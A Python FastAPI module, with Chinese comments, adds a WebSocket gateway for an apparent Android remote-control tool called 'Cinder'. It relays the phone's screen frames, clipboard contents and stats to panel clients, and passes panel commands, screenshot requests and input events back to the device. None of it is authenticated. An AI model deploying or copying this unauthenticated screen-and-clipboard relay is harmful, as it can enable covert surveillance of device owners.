# -*- coding: utf-8 -*-
"""
Cinder WebSocket 兼容层
---------------------------------
现有 main.py 已有 /ws/agent（Agent 专用）与 /ws/panel（面板专用）。
APK 里的 WsClient 连接的是 /ws?role=agent&id=xxx，协议为 {t, d} 简写格式。
本模块只加一个 /ws 端点，把 {t,d} 翻译成 main.py 内部既有协议 {type,...}，
从而复用 AGENTS / FRAMES / CMDS / REC 与 _dispatch，不动原有逻辑。

挂载方式（main.py 中，app 创建之后加两行）：
    from ws_compat import register as _ws_compat_register
    _ws_compat_register(app)
"""
import asyncio
import base64
import time

from fastapi import WebSocket, WebSocketDisconnect

PING_INTERVAL = 20          # 秒；Render 空闲约 15 分钟掐线，20s 保活
MAX_FRAME_BYTES = 400000    # 单帧上限，与 /ws/agent 保持一致


def register(app, get_agents, get_frames, get_cmds, get_rec, get_log,
             get_dispatch, get_health):
    """把依赖以闭包方式传入，避免循环 import"""
    AGENTS = get_agents()
    FRAMES = get_frames()
    CMDS = get_cmds()
    REC = get_rec()
    _log = get_log()
    _dispatch = get_dispatch()
    _health = get_health()

    async def _send(ws, obj):
        try:
            await ws.send_json(obj)
            return True
        except Exception:
            return False

    async def _broadcast_clients(obj):
        dead = []
        for c in list(CLIENTS):
            if not await _send(c, obj):
                dead.append(c)
        for d in dead:
            CLIENTS.discard(d)

    CLIENTS = set()

    async def _pinger(ws):
        while True:
            await asyncio.sleep(PING_INTERVAL)
            if not await _send(ws, {"t": "ping", "ts": int(time.time())}):
                break

    @app.websocket("/ws")
    async def ws_gateway(ws: WebSocket):
        await ws.accept()
        role = ws.query_params.get("role", "client")
        aid = ws.query_params.get("id", "default") or "default"
        pinger = None
        try:
            if role == "agent":
                AGENTS[aid] = ws
                pinger = asyncio.create_task(_pinger(ws))
                await _send(ws, {"t": "hello", "ok": True, "id": aid,
                                 "ts": int(time.time())})
                _log(f"[ws] Agent 上线：{aid}")
                await _broadcast_clients({"t": "agent",
                                          "d": {"online": True, "id": aid}})
                while True:
                    msg = await ws.receive_json()
                    await _handle_agent(aid, ws, msg)
            else:
                CLIENTS.add(ws)
                pinger = asyncio.create_task(_pinger(ws))
                await _send(ws, {"t": "hello", "ok": True, "role": "client"})
                while True:
                    msg = await ws.receive_json()
                    await _handle_client(ws, msg)
        except WebSocketDisconnect:
            pass
        except Exception as e:
            _log(f"[ws] 异常 {role}:{aid} {e}")
        finally:
            if pinger:
                pinger.cancel()
            if role == "agent" and AGENTS.get(aid) is ws:
                AGENTS.pop(aid, None)
                FRAMES.pop(aid, None)
                _log(f"[ws] Agent 离线：{aid}")
                await _broadcast_clients({"t": "agent",
                                          "d": {"online": False, "id": aid}})
            CLIENTS.discard(ws)

    async def _handle_agent(aid, ws, msg):
        t = msg.get("t") or msg.get("type")
        d = msg.get("d") if isinstance(msg.get("d"), dict) else {}

        if t in ("pong", "ping"):
            return

        # 画面帧：APK 传 base64，兼容旧 hex
        if t == "frame":
            raw = b""
            b64 = d.get("b64") or msg.get("b64")
            hexs = d.get("hex") or msg.get("hex") or msg.get("data")
            if b64:
                try:
                    raw = base64.b64decode(b64)
                except Exception:
                    raw = b""
            elif hexs:
                try:
                    raw = bytes.fromhex(str(hexs))
                except Exception:
                    raw = b""
            if raw:
                FRAMES[aid] = raw[:MAX_FRAME_BYTES]
                if REC:
                    for k in REC:
                        try:
                            REC[k].append(raw)
                        except Exception:
                            pass
            return

        # 指令回执：对应 main.py 里 _dispatch 等待的 Future
        if t == "result":
            cid = str(d.get("id") or msg.get("id") or "")
            fut = CMDS.get(cid)
            if fut and not fut.done():
                fut.set_result(d or msg)
            return

        if t == "log":
            _log(f"[{aid}] {d.get('msg') or msg.get('text', '')}")
            return

        if t == "clipboard":
            await _broadcast_clients({"t": "agent", "d": {"clipboard": d}})
            return

        if t == "stats":
            await _broadcast_clients({"t": "agent", "d": {"stats": d}})
            return

        # 兼容 {type:"register"} 旧格式
        if t == "register":
            await _send(ws, {"t": "registered", "id": aid})
            return

    async def _handle_client(ws, msg):
        t = msg.get("t") or msg.get("type")
        d = msg.get("d") if isinstance(msg.get("d"), dict) else {}
        aid = msg.get("agent") or (d.get("id") if d else "") or "default"

        if t in ("pong", "ping"):
            return

        if t == "cmd":
            action = d.get("action") or msg.get("action") or ""
            args = d.get("args", "")
            r = await _dispatch(action, value=args, text=args, cmd=args,
                                url=args, _agent=aid)
            await _send(ws, {"t": "result", "d": {"action": action,
                                                  "ok": bool(r.get("ok")),
                                                  "executed": r.get("executed")}})
            return

        # 面板要一帧截图
        if t == "shot":
            target = AGENTS.get(aid) or (list(AGENTS.values())[0] if AGENTS else None)
            if target:
                await _send(target, {"t": "shot", "d": {}})
            else:
                await _send(ws, {"t": "err", "msg": "no agent online"})
            return

        # 开关推流
        if t == "stream":
            target = AGENTS.get(aid) or (list(AGENTS.values())[0] if AGENTS else None)
            if target:
                await _send(target, {"t": "stream", "d": {"on": bool(d.get("on"))}})
            else:
                await _send(ws, {"t": "err", "msg": "no agent online"})
            return

        if t == "input":
            target = AGENTS.get(aid) or (list(AGENTS.values())[0] if AGENTS else None)
            if target:
                await _send(target, {"t": "input", "d": d})
            return

    return ws_gateway
